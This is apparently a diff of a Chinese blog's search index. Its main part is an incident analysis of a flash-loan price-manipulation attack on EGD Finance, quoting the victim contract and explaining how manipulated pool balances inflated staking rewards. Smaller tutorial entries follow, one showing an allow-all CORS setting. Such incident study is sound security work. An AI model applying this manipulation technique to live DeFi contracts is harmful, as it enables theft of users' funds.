-<p>下面质押步骤和兑换奖励步骤都是攻击者真实发起的交易步骤</p>
-<h3 id="质押步骤"><a href="#质押步骤" class="headerlink" title="质押步骤"></a>质押步骤</h3><p><a href="https://bscscan.com/address/0xbc5e8602c4fba28d0efdbf3c6a52be455d9558f5">Address 0xbc5e8602c4fba28d0efdbf3c6a52be455d9558f5 | BscScan</a> 调用攻击合约的<code>stake()</code>函数进行相应的抵押操作，该地址应该也是攻击者地址，其创建了攻击合约</p>
-<p>具体交易如下：<a href="https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8">BNB Smart Chain Transaction Hash (Txhash) Details | BscScan</a></p>
-<p>我们可以在Phalcon上看到该交易的具体调用信息：</p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191601130.png" alt="image-20231219160115062"></p>
-<p>这里进一步进行分析：</p>
-<p><a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a>中<code>bond()</code>函数应该只是填写以下邀请人，应该跟web2一样，每个地址的邀请人和质押收益相关</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function bond(address invitor) external &#123;        </span><br><span class="line">        require(userInfo[msg.sender].invitor == address(0), &#x27;have invitor&#x27;);</span><br><span class="line">        require(userInfo[invitor].invitor != address(0) || invitor == fund, &#x27;wrong invitor&#x27;);</span><br><span class="line">        userInfo[msg.sender].invitor = invitor;</span><br><span class="line">        userInfo[invitor].refer ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>接下来的<code>swapETHForExactTokens()</code>调用是Defi中很常见的代币交换操纵，通过地址看源码，其与uniswap_v2的对应函数一致</p>
-<p>从名称中可以看出是向通过不确定数量的ETH来换取一定数量的代币，可以确定交换的是USDT</p>
-<p>uniswap的参数列表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapETHForExactTokens(</span><br><span class="line">    uint amountOut, // 交易获得的代币数量</span><br><span class="line">    address[] calldata path, // 交易路径列表</span><br><span class="line">    address to, // 交易获得的 token 发送到的地址</span><br><span class="line">    uint deadline // 过期时间</span><br><span class="line">) external virtual override payable ensure(deadline) returns (</span><br><span class="line">    uint[] memory amounts // 交易期望数量列表</span><br><span class="line">)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#readProxyContract">PancakeSwap: Router v2 | Address 0x10ed43c718714eb63d5aa57b78b54704e256024e | BscScan</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)</span><br><span class="line">    external</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    payable</span><br><span class="line">    ensure(deadline)</span><br><span class="line">    returns (uint[] memory amounts)</span><br><span class="line">&#123;</span><br><span class="line">	//检查是否为WETH进行交换</span><br><span class="line">    require(path[0] == WETH, &#x27;PancakeRouter: INVALID_PATH&#x27;);</span><br><span class="line">    // 从library中获知得到amountOut数量的USDT，需要多少ETH</span><br><span class="line">    amounts = PancakeLibrary.getAmountsIn(factory, amountOut, path);</span><br><span class="line">    //发给pancake的ETH必须大于所需数量</span><br><span class="line">    require(amounts[0] &lt;= msg.value, &#x27;PancakeRouter: EXCESSIVE_INPUT_AMOUNT&#x27;);</span><br><span class="line">    // 将 WETH 换成 ETH（对应phalcon的操作）</span><br><span class="line">    IWETH(WETH).deposit&#123;value: amounts[0]&#125;();</span><br><span class="line">    // 将 amounts[0] 数量的 path[0] 代币从用户账户中转移到 path[0], path[1] 的流动池</span><br><span class="line">    assert(IWETH(WETH).transfer(PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]));</span><br><span class="line">    // 按 path 列表执行交易集合，不细究了，之后再详细看uniswap-qwq</span><br><span class="line">    _swap(amounts, path, to);</span><br><span class="line">    // 返回多余的ETH</span><br><span class="line">    if (msg.value &gt; amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最后调用代理合约的<code>stake()</code>函数，质押100个USDT，从Phalcon中的调用记录可看出，具体函数代码不进行分析了，主要是记录了很多相关信息，用于后续的奖励计算，可见<a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a></p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191624242.png" alt="image-20231219162437653"></p>
-<h3 id="兑换奖励步骤"><a href="#兑换奖励步骤" class="headerlink" title="兑换奖励步骤"></a>兑换奖励步骤</h3><p><a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd">Address 0xee0221d76504aec40f63ad7e36855eebf5ea5edd | BscScan</a>攻击者调用攻击合约的<code>harvest()</code>函数进行相应的兑换奖励，phalcon的交易分析如下图所示：</p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191628484.png" alt="image-20231219162808682"></p>
-<p>首先调用合约的<code>calculateAll()函数</code>对用户的质押奖励进行计算，计算用户总共能得到多少收益</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function calculateReward(address addr, uint slot) public view returns (uint)&#123;</span><br><span class="line">    UserSlot memory info = userSlot[addr][slot];</span><br><span class="line">    if (info.leftQuota == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    uint totalRew = (block.timestamp - info.claimTime) * info.rates;</span><br><span class="line">    if (totalRew &gt;= info.leftQuota) &#123;</span><br><span class="line">        totalRew = info.leftQuota;</span><br><span class="line">    &#125;</span><br><span class="line">    return totalRew;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>随后用户就展开了闪电贷操作，</p>
-<p>先是通过<code>PancakeSwap</code>（0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae）调用<code>swap()函数</code>借到200个USDT，随后乐观转账，回调攻击合约的<code>pancakeCall()函数</code>可见之前的闪电贷分析文章。</p>
-<p>在<code>pancakecall()函数中</code>又发起闪电贷，从<code>Pancake LPs</code>（0xa361433e409adac1f87cdf133127585f8a93c67d）中调用<code>swap()函数</code>借到424456个USDT，再次回调到<code>pancakeCall()函数</code>中，这是用户调用<code>claimAllReward()函数</code>兑换自己之前质押的奖励。</p>
-<blockquote>
-<p>为什么在这里兑换奖励，应该很明显能够猜到是因为，闪电贷的大笔金额影响了奖励的计算方法，这里应该是计算质押奖励的函数出现了漏洞问题。</p>
-</blockquote>
-<p>下面去<a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#readProxyContract">PancakeSwap: Router v2 | Address 0x10ed43c718714eb63d5aa57b78b54704e256024e | BscScan</a>项目的<code>claimAllReward()</code>中看一下具体源码，进行了详细的注释：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimAllReward() external &#123;</span><br><span class="line">		//判断是否存在对应的质押</span><br><span class="line">       require(userInfo[msg.sender].userStakeList.length &gt; 0, &#x27;no stake&#x27;);</span><br><span class="line">       require(!black[msg.sender],&#x27;black&#x27;);</span><br><span class="line">       //获取质押时的，一系列质押记录，包括金额、时间戳等等</span><br><span class="line">       uint[] storage list = userInfo[msg.sender].userStakeList;</span><br><span class="line">       uint rew;</span><br><span class="line">       uint outAmount;</span><br><span class="line">       uint range = list.length;</span><br><span class="line">       //计算对应的奖励</span><br><span class="line">       for (uint i = 0; i &lt; range; i++) &#123;</span><br><span class="line">           UserSlot storage info = userSlot[msg.sender][list[i - outAmount]];</span><br><span class="line">           require(info.totalQuota != 0, &#x27;wrong index&#x27;);</span><br><span class="line">           //不能超过一个最大奖励</span><br><span class="line">           uint quota = (block.timestamp - info.claimTime) * info.rates;</span><br><span class="line">           if (quota &gt;= info.leftQuota) &#123;</span><br><span class="line">               quota = info.leftQuota;</span><br><span class="line">           &#125;</span><br><span class="line">           //关键步骤，计算对应的奖励，仔细看一下getEGDPrice()函数</span><br><span class="line">           //根据EGD的价格，来确定奖励多少EGD</span><br><span class="line">           rew += quota * 1e18 / getEGDPrice();</span><br><span class="line">           //下面是一些计算账户剩下最大奖励，以及账户余额（+利息）等操作</span><br><span class="line">           info.claimTime = block.timestamp;</span><br><span class="line">           info.leftQuota -= quota;</span><br><span class="line">           info.claimedQuota += quota;</span><br><span class="line">           if (info.leftQuota == 0) &#123;</span><br><span class="line">               userInfo[msg.sender].totalAmount -= info.totalQuota;</span><br><span class="line">               delete userSlot[msg.sender][list[i - outAmount]];</span><br><span class="line">               list[i - outAmount] = list[list.length - 1];</span><br><span class="line">               list.pop();</span><br><span class="line">               outAmount ++;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       //更新相应的质押列表</span><br><span class="line">       userInfo[msg.sender].userStakeList = list;</span><br><span class="line">       //发送响应的奖励</span><br><span class="line">       EGD.transfer(msg.sender, rew);</span><br><span class="line">       userInfo[msg.sender].totalClaimed += rew;</span><br><span class="line">       emit Claim(msg.sender,rew);</span><br><span class="line">   &#125;</span><br><span class="line">   function getEGDPrice() public view returns (uint)&#123;</span><br><span class="line">   	//可在phalcon上看到行营的记录</span><br><span class="line">       uint balance1 = EGD.balanceOf(pair);</span><br><span class="line">       uint balance2 = U.balanceOf(pair);</span><br><span class="line">       //EGD的价格仅仅是根据两种代币的实时数量（流动性）来进行计算，可以被攻击者操纵</span><br><span class="line">       return (balance2 * 1e18 / balance1);</span><br><span class="line">   &#125;</span><br><span class="line">   function initialize() public initializer &#123;</span><br><span class="line">       __Context_init_unchained();</span><br><span class="line">       __Ownable_init_unchained();</span><br><span class="line">       rate = [200, 180, 160, 140];</span><br><span class="line">       startTime = block.timestamp;</span><br><span class="line">       referRate = [6, 3, 1, 1, 1, 1, 1, 1, 2, 3];</span><br><span class="line">       rateList = [547,493,438,383];</span><br><span class="line">       dailyStakeLimit = 1000000 ether;</span><br><span class="line">       wallet = 0xC8D45fF624F698FA4E745F02518f451ec4549AE8;</span><br><span class="line">       fund = 0x9Ce3Aded1422A8c507DC64Ce1a0C759cf7A4289F;</span><br><span class="line">       EGD = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98);</span><br><span class="line">       U = IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">       router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);</span><br><span class="line">       pair = IPancakeFactory(router.factory()).getPair(address(EGD),address(U));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>EGD的价格是根据两种代币在一个地址上的数量进行计算的，我们在<code>initialize()函数</code>中得到pair地址，pair地址是根据router地址进行计算，router为一个代理合约，在区块链浏览器上我们可以看到pair的地址为0xa361433e409adac1f87cdf133127585f8a93c67d，为pancake的一个提供流动性的合约，是不是有点眼熟。</p>
-<p>到这里我们也肯定发现了攻击为什么能成功？</p>
-<ul>
-<li>用户先通过闪电贷在<code>Pancake LPs</code>0xa361…中借走了大量的USDT，导致<code>Pancake LPs</code>中USDT与EGDpair对中，EGD的价格变得十分便宜。</li>
-<li>这时用户在<code>pancakeCall()回调函数</code>中，兑换奖励，奖励的计算是根据<code>Pancake LPs</code>中两种代币的数量进行计算EDG价格，导致EDG的价格很便宜，这是看到<code>rew</code>的计算公式，用户获得超额奖励。</li>
-</ul>
-<p>下面简单介绍一下，phalcon上后续的调用：</p>
-<p>先将<code>Pancake LPs</code>上借用的闪电贷归还；随进行了相应的k值验证（确保还款&#x3D;原款+手续费）</p>
-<p>随后在<code>PancakeSwap: WBNB-BSC-USD 2</code>借用的闪电贷，进行相应的approve授权</p>
-<p>调用swapExactTokensForTokensSupportingFeeOnTransferTokens函数将得到的EGD全部兑换成USDT</p>
-<p>随后<code>PancakeSwap: WBNB-BSC-USD 2</code>借用的闪电贷归还，并进行相应的k值验证</p>
-<p>最后攻击者获利36044 USDT</p>
-]]></content>
-      <categories>
-        <category>Defi安全</category>
-      </categories>
-      <tags>
-        <tag>Defi安全</tag>
-        <tag>安全事件分析</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Solidity合约调用详解</title>
     <url>/2023/12/16/Solidity%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最近在做毕设，在slither的基础上搭建一个检测器，需要对solidity中的合约调用范式进行建模，在remix上对合约调用进行了很多尝试qwq，说多了都是泪，故系统总结一下。<br><code>solidity环境：0.8.13</code></p>
@@ -273,85 +306,6 @@
       <tags>
         <tag>服务器</tag>
         <tag>linux工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vue+Django前后端交互跨域</title>
-    <url>/2023/12/16/Vue-Django%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92%E8%B7%A8%E5%9F%9F/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Vue-Django前后端开发"><a href="#Vue-Django前后端开发" class="headerlink" title="Vue+Django前后端开发"></a>Vue+Django前后端开发</h1><p>当我们从零开始利用Vue和Django开发的时候，就会遇到跨域问题，一般来说Vue本地端口可以是8080或者其它，Django的本地端口一般是8000。<br>虽然在Vue中我们用axios 向8000端口发送http请求，但还是收到跨域访问的限制<br>这里分别从前后端说明该如何配置，解决跨域问题</p>
-<h2 id="前端Vue配置"><a href="#前端Vue配置" class="headerlink" title="前端Vue配置"></a>前端Vue配置</h2><h3 id="1-config-index-js"><a href="#1-config-index-js" class="headerlink" title="1. config&#x2F;index.js"></a>1. config&#x2F;index.js</h3><p>基于封装好的axios来进行跨域<br>在前端config&#x2F;index.js中,设置proxy进行跨域</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">devServer</span>:&#123;</span><br><span class="line">      <span class="attr">proxy</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;/api&#x27;</span>:&#123;<span class="comment">//表示拦截以/api开头的请求路径</span></span><br><span class="line">          <span class="attr">target</span>:<span class="string">&#x27;http://127.0.0.1:8000&#x27;</span>,</span><br><span class="line">          <span class="attr">changOrigin</span>: <span class="literal">true</span>,<span class="comment">//是否开启跨域</span></span><br><span class="line">          <span class="attr">pathRewrite</span>:&#123;</span><br><span class="line">            <span class="string">&#x27;^/api&#x27;</span>:<span class="string">&#x27;&#x27;</span> <span class="comment">//重写api，把api变成空字符，因为我们真正请求的路径是没有api的</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="2-axios的封装文件"><a href="#2-axios的封装文件" class="headerlink" title="2. axios的封装文件"></a>2. axios的封装文件</h3><p>建立一个json文件，对axios.create进行封装的时候，将其baseURL设置为api，如下所示</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;/api&#x27;</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">50000</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-<h2 id="后端Django配置"><a href="#后端Django配置" class="headerlink" title="后端Django配置"></a>后端Django配置</h2><h3 id="1-安装django-cors-headers库"><a href="#1-安装django-cors-headers库" class="headerlink" title="1. 安装django-cors-headers库"></a>1. 安装django-cors-headers库</h3><p>在python环境下直接pip install 进行安装</p>
-<h3 id="2-设置setting-py文件"><a href="#2-设置setting-py文件" class="headerlink" title="2. 设置setting.py文件"></a>2. 设置setting.py文件</h3><p>在setting.py中，在INSTALLED_APPS中添加跨域所需的APP<code>corsheaders</code>,同时在MIDDLEWARE中也添加响应的中间件，并将允许跨域请求的请求方式进行设置，设置为ALL</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    ......</span><br><span class="line">    <span class="string">&#x27;corsheaders&#x27;</span>,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">MIDDLEWARE = [</span><br><span class="line">    ......</span><br><span class="line">    <span class="string">&#x27;corsheaders.middleware.CorsMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">CORS_ORIGIN_ALLOW_ALL = <span class="literal">True</span></span><br><span class="line">CORS_ALLOW_CREDENTIALS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
-<p>如果前后端都进行了这样的设置之后，应该前后端就能够进行数据的交互了！</p>
-]]></content>
-      <categories>
-        <category>前后端</category>
-      </categories>
-      <tags>
-        <tag>前后端</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>foundry使用一</title>
-    <url>/2023/12/15/foundry%E4%BD%BF%E7%94%A8(%E4%B8%80)--foundry%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-Foundry环境搭建："><a href="#1-Foundry环境搭建：" class="headerlink" title="1. Foundry环境搭建："></a>1. Foundry环境搭建：</h1><h2 id="1-1-拉取Foundry-镜像"><a href="#1-1-拉取Foundry-镜像" class="headerlink" title="1.1 拉取Foundry 镜像"></a>1.1 拉取<code>Foundry</code> 镜像</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">docker pull ghcr.io/foundry-rs/foundry:latest</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-2-以sh形式，创建一个新的容器，并运行对应的容器"><a href="#1-2-以sh形式，创建一个新的容器，并运行对应的容器" class="headerlink" title="1.2 以sh形式，创建一个新的容器，并运行对应的容器"></a>1.2 以sh形式，创建一个新的容器，并运行对应的容器</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="keyword">run</span><span class="language-bash"> -d -v /local_dir:/docker_dir -it --name new_name image_name /bin/sh</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>-d</code>：让容器在后台运行</li>
-<li><code>-v</code>：用以挂载卷</li>
-<li><code>-it</code>：用交互模式运行容器，并分配一个伪终端</li>
-<li><code>--name</code> ：给容器命名</li>
-</ul>
-<h2 id="1-3-查看容器的是否运行，以及容器id"><a href="#1-3-查看容器的是否运行，以及容器id" class="headerlink" title="1.3 查看容器的是否运行，以及容器id"></a>1.3 查看容器的是否运行，以及容器id</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-4-进行容器交互界面"><a href="#1-4-进行容器交互界面" class="headerlink" title="1.4 进行容器交互界面"></a>1.4 进行容器交互界面</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it containerID/name /bin/sh</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>区块链工具</category>
-      </categories>
-      <tags>
-        <tag>区块链安全</tag>
-        <tag>区块链工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python与智能合约交互（测试链）</title>
-    <url>/2023/12/16/python%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E4%BA%A4%E4%BA%92%EF%BC%88%E6%B5%8B%E8%AF%95%E9%93%BE%EF%BC%89/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-智能合约"><a href="#1-智能合约" class="headerlink" title="1. 智能合约"></a>1. 智能合约</h1><p>这里用以太坊公链进行说明，以太坊上支持的智能合约主要是由Solidity语言编写，后续介绍都以，以太坊的Goerli测试链为例，进行介绍。<br><strong>智能合约</strong> ：是指用特定语言编写，后将其部署到区块链上，实现特定功能的代码。<br>之前一直研究智能合约的漏洞，而并没有与实际测试链上智能合约进行交互，这次一项目用到这，对web3.py进行了学习。<br>现在主流智能合约的开发，一般都不太会用web.py，都有封装好的truffle框架，hardhat框架，以及Foundry等。<br>本文只是对完整web3开发的一个初步了解。</p>
-<h1 id="2-测试链和节点数据"><a href="#2-测试链和节点数据" class="headerlink" title="2. 测试链和节点数据"></a>2. 测试链和节点数据</h1><p>这里我们用的以太坊的测试链Goerli，Sepolia也可以用，以及自己通过geth，ganache搭建的私链都可以来测试<br>先尝试着连接区块链：</p>
-<ul>
-<li>测试链的话，去infura上申请个节点，会给你个url，相当于可以通过这个节点访问测试链上数据</li>
-<li>私链的话，直接连接服务器或本机的某个端口就行，一般是7545 or 8545</li>
-</ul>
-<h1 id="3-web3-py的使用"><a href="#3-web3-py的使用" class="headerlink" title="3. web3.py的使用"></a>3. web3.py的使用</h1><p>首先安装web3</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install web3</span><br></pre></td></tr></table></figure>
-<h2 id="3-1-连接区块链"><a href="#3-1-连接区块链" class="headerlink" title="3.1 连接区块链"></a>3.1 连接区块链</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">w3 = Web3(Web3.HTTPProvider(url))</span><br><span class="line"><span class="built_in">print</span>(w3.is_connected())  <span class="comment">##判断是否连接上</span></span><br></pre></td></tr></table></figure>
-<h2 id="3-2-部署合约"><a href="#3-2-部署合约" class="headerlink" title="3.2 部署合约"></a>3.2 部署合约</h2><h3 id="3-2-1-获取abi和bytecode"><a href="#3-2-1-获取abi和bytecode" class="headerlink" title="3.2.1 获取abi和bytecode:"></a>3.2.1 获取abi和bytecode:</h3><p>web3.py在部署合约之前需要通过对源码进行解析得到其abi和bytecode<br><strong>abi</strong>：abi主要包含的合约的函数调用信息，即函数参数，返回值，签名等信息<br><strong>bytecode</strong>：bytecode是指源码进行编译得到的二进制代码<br>python可以通过&#x3D;&#x3D;solcx&#x3D;&#x3D;库中的&#x3D;&#x3D;compile_standard&#x3D;&#x3D;函数进行合约解析，得到合约的abi和字节码，在创建合约，部署合约时会用到。</p>
-<h3 id="3-2-2-部署合约："><a href="#3-2-2-部署合约：" class="headerlink" title="3.2.2 部署合约："></a>3.2.2 部署合约：</h3><p>部署合约则主要通过官方封装的标准函数来实现，web3.py，web3.js的相关函数与geth官方的函数很像。</p>
-<ul>
-<li>构建部署合约这一交易<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Contract = w3.eth.contract(abi = abi, bytecode = bytecode)</span><br><span class="line">nonce = w3.eth.get_transaction_count(Goerli_address)</span><br><span class="line">transaction = Contract.constructor().build_transaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: Goerli_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: nonce</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
-<li>签名发布该交易<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key = Goerli_privateKey)   </span><br><span class="line"><span class="comment">##账户私钥对交易进行验证</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)    </span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="comment">##根据交易哈希获取交易凭证，可获取部署合约的地址</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="3-2-3-调用合约中的函数"><a href="#3-2-3-调用合约中的函数" class="headerlink" title="3.2.3 调用合约中的函数"></a>3.2.3 调用合约中的函数</h3><p>以太坊中调用函数主要是通过call的方式调用函数签名进行实现。<br>可见毕设之前总结的文章<a href="https://blog.csdn.net/m0_53689197/article/details/129721360?spm=1001.2014.3001.5502">solidity合约函数调用</a></p>
-<p>这里为了方便起见，我们用函数名直接对函数进行调用<br>这里以调用<strong>storeUserData</strong>这一函数为例，进行说明：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Contract = w3.eth.contract(address = contract_address, abi = abi) </span><br><span class="line">nonce = w3.eth.get_transaction_count(call_address)</span><br><span class="line">transaction = Contract.functions.storeUserData(dataHash).build_transaction(</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="string">&quot;gas&quot;</span>: <span class="number">1000000</span>,</span><br><span class="line">       <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">       <span class="string">&quot;from&quot;</span>: call_address,</span><br><span class="line">       <span class="string">&quot;nonce&quot;</span>: nonce </span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">## dataHash这里为storeUserData需要传入的参数</span></span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key = addressKey)</span><br><span class="line"><span class="comment">##签名该函数调用的交易</span></span><br><span class="line">send_tx = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(send_tx)</span><br><span class="line"><span class="comment">## 根据交易哈希，获取交易凭证，后对交易凭证进行分析处理</span></span><br></pre></td></tr></table></figure>
-<h3 id="3-2-4-Event的监听"><a href="#3-2-4-Event的监听" class="headerlink" title="3.2.4 Event的监听"></a>3.2.4 Event的监听</h3><p>因为后续实现对函数抛出的event进行实时监听，上述代码中获得了函数调用交易的tx_receipt，即交易凭证，其中就包含了event的log信息。<br>代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logs = Contract.events.AccessRequested().process_receipt(tx_receipt)</span><br><span class="line"><span class="comment">## AccessRequested()为对应的事件event</span></span><br></pre></td></tr></table></figure>
-<p>随后对logs进行处理，即可实现实时监听合约的event抛出了</p>
-]]></content>
-      <categories>
-        <category>智能合约</category>
-        <category>以太坊</category>
-      </categories>
-      <tags>
-        <tag>区块链安全</tag>
-        <tag>Solidity</tag>
       </tags>
   </entry>
   <entry>
@@ -442,66 +396,101 @@
       </tags>
   </entry>
   <entry>
-    <title>价格操纵攻击再理解</title>
-    <url>/2023/12/16/%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%86%8D%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文的主要参考是METATRUST的捕鲸船分享，链接如下：</p>
-<p><a href="https://www.youtube.com/watch?v=czyajRIHYlg">MetaTrust价格操纵攻击分享</a></p>
-<h2 id="价格操纵的来源："><a href="#价格操纵的来源：" class="headerlink" title="价格操纵的来源："></a>价格操纵的来源：</h2><p>区块链世界中，为保持所有节点的共识一致，区块链阉割了每个节点独立获取链外信息的能力</p>
-<p>区块链想获取类似外界的价格信息，只有两种方式：</p>
+    <title>python与智能合约交互（测试链）</title>
+    <url>/2023/12/16/python%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E4%BA%A4%E4%BA%92%EF%BC%88%E6%B5%8B%E8%AF%95%E9%93%BE%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-智能合约"><a href="#1-智能合约" class="headerlink" title="1. 智能合约"></a>1. 智能合约</h1><p>这里用以太坊公链进行说明，以太坊上支持的智能合约主要是由Solidity语言编写，后续介绍都以，以太坊的Goerli测试链为例，进行介绍。<br><strong>智能合约</strong> ：是指用特定语言编写，后将其部署到区块链上，实现特定功能的代码。<br>之前一直研究智能合约的漏洞，而并没有与实际测试链上智能合约进行交互，这次一项目用到这，对web3.py进行了学习。<br>现在主流智能合约的开发，一般都不太会用web.py，都有封装好的truffle框架，hardhat框架，以及Foundry等。<br>本文只是对完整web3开发的一个初步了解。</p>
+<h1 id="2-测试链和节点数据"><a href="#2-测试链和节点数据" class="headerlink" title="2. 测试链和节点数据"></a>2. 测试链和节点数据</h1><p>这里我们用的以太坊的测试链Goerli，Sepolia也可以用，以及自己通过geth，ganache搭建的私链都可以来测试<br>先尝试着连接区块链：</p>
 <ul>
-<li>通过实体类似Chainlink主动喂价，不断地将价格数据发布到链上</li>
-<li>直接通过某个智能合约中存储的参数，如uniswap等</li>
